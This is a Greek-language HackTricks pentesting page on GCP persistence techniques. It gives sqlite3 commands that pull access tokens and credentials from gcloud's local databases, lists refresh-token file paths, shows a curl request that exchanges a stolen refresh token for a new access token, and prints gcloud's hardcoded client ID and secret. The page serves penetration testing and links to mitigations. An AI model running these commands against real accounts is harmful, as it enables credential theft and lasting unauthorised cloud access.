# GCP - Μη-υπηρεσιακή Διατήρηση

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης των HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στα HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

Αυτές είναι χρήσιμες τεχνικές όταν, με κάποιον τρόπο, έχετε διαρρεύσει κάποια διαπιστευτήρια GCP ή μηχανή που τρέχει σε περιβάλλον GCP.

## Απαγωγή Διακριτικού

### Διακριτικά Χρήστη που Έχουν Ταυτοποιηθεί

Για να λάβετε το **τρέχον διακριτικό** ενός χρήστη μπορείτε να εκτελέσετε: 

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

Ελέγξτε σε αυτήν τη σελίδα πως να **χρησιμοποιήσετε απευθείας αυτό το τοκεν χρησιμοποιώντας το gcloud**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

Για να λάβετε τις λεπτομέρειες για τη **δημιουργία ενός νέου τοκεν πρόσβασης** εκτελέστε: 

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

Είναι επίσης δυνατόν να βρείτε refresh tokens στο **`$HOME/.config/gcloud/application_default_credentials.json`** και στο **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

Για να λάβετε ένα νέο ανανεωμένο access token με το **refresh token**, τον αριθμό ταυτότητας πελάτη (client ID) και το μυστικό του πελάτη (client secret), εκτελέστε: 

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

Η ισχύτητα των refresh tokens μπορεί να διαχειριστεί στο **Admin** > **Security** > **Google Cloud session control**, και από προεπιλογή είναι ρυθμισμένη σε 16 ώρες, αν και μπορεί να οριστεί να μην λήξει ποτέ:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Ροή Εξουσιοδότησης

Η ροή εξουσιοδότησης κατά τη χρήση κάτι σαν το `gcloud auth login` θα ανοίξει ένα παράθυρο στον περιηγητή και μετά την αποδοχή όλων των scopes, ο περιηγητής θα στείλει ένα αίτημα όπως αυτό στη θύρα http που είναι ανοικτή από το εργαλείο:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Στη συνέχεια, το gcloud θα χρησιμοποιήσει την κατάσταση και τον κώδικα με ορισμένα hardcoded `client_id` (`32555940559.apps.googleusercontent.com`) και **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) για να λάβει τα **δεδομένα τελικού ανανεωμένου τοκέν**.

{% hint style="danger" %}
Σημειώστε ότι η επικοινωνία με το localhost γίνεται μέσω HTTP, οπότε είναι δυνατόν να παρακολουθηθούν τα δεδομένα για να αποκτηθεί ένα ανανεωμένο τοκέν, ωστόσο αυτά τα δεδομένα είναι έγκυρα μόνο μία φορά, οπότε αυτό θα ήταν άχρηστο, είναι πιο εύκολο απλά να διαβάσετε το ανανεωμένο τοκέν από το αρχείο.
{% endhint %}

### Λογαριασμοί Υπηρεσιών

Όπως και με τους πιστοποιημένους χρήστες, αν καταφέρετε να **διαρρήξετε το αρχείο ιδιωτικού κλειδιού** ενός λογαριασμού υπηρεσίας, θα μπορείτε να **έχετε πρόσβαση σε αυτό συνήθως όσο θέλετε**.\
Ωστόσο, αν κλέψετε το **Διακριτικό Αυθεντικοποίησης (OAuth token)** ενός λογαριασμού υπηρεσίας, αυτό μπορεί να είναι ακόμη πιο ενδιαφέρον, επειδή, ακόμη και αν από προεπιλογή αυτά τα τοκεν είναι χρήσιμα μόνο για μία ώρα, αν ο **θύμα διαγράψει το ιδιωτικό κλειδί api, το διακριτικό OAuth θα παραμείνει έγκυρο μέχρι να λήξει**.

### Μεταδεδομένα

Φυσικά, όσο βρίσκεστε μέσα σε μια μηχανή που τρέχει στο περιβάλλον GCP θα μπορείτε να **έχετε πρόσβαση στον λογαριασμό υπηρεσίας που είναι συνδεδεμένος με αυτή τη μηχανή επικοινωνώντας με το σημείο μεταδεδομένων** (σημειώστε ότι τα διακριτικά OAuth που μπορείτε να έχετε πρόσβαση σε αυτό το σημείο συνήθως περιορίζονται από τις εμβέλειες).

### Διορθώσεις

Ορισμένες διορθώσεις για αυτές τις τεχνικές εξηγούνται στο [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## Αναφορές

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
